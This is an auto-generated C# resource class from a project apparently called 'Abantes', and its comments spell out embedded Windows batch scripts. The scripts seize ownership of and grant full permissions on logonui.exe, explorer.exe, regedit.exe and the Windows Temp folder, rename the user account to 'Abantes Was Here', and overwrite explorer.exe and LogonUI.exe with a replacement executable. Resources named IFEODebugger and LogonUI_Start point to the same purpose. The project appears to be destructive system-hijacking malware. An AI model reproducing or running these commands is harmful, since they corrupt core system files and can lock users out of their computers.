﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Abantes.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Abantes.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to @echo on
        ///cd\&amp;cd Windows\System32
        ///takeown /f logonui.exe
        ///icacls logonui.exe /granted %username%:F
        ///cd\&amp;cd Windows
        ///takeown /f explorer.exe
        ///takeown /f regedit.exe
        ///takeown /f HelpPane.exe
        ///takeown /f &quot;C:\Windows\Temp&quot; /r /d y
        ///icacls &quot;C:\Windows\Temp&quot; /granted %username%:F /T /C
        ///icacls regedit.exe /granted %username%:F
        ///icacls explorer.exe /granted %username%:F
        ///icacls HelpPane.exe /granted %username%:F
        ///wmic useraccount where name=&apos;%username%&apos; set FullName=&apos;Abantes Was Here&apos;
        ///wmic useraccount where name [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Action {
            get {
                return ResourceManager.GetString("Action", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] creepy_mouse {
            get {
                object obj = ResourceManager.GetObject("creepy_mouse", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to @echo on
        ///cd\
        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\explorer.exe&quot; /Y
        ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
        /// </summary>
        internal static string ExplorerOverWrite {
            get {
                return ResourceManager.GetString("ExplorerOverWrite", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] icon {
            get {
                object obj = ResourceManager.GetObject("icon", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] IFEODebugger {
            get {
                object obj = ResourceManager.GetObject("IFEODebugger", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to @echo on
        ///cd\
        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
        ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
        /// </summary>
        internal static string LogonOverwrite {
            get {
                return ResourceManager.GetString("LogonOverwrite", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] LogonUI_Start {
            get {
                object obj = ResourceManager.GetObject("LogonUI_Start", resourceCulture);
                return ((byte[])(obj));
            }
        }
    }
}
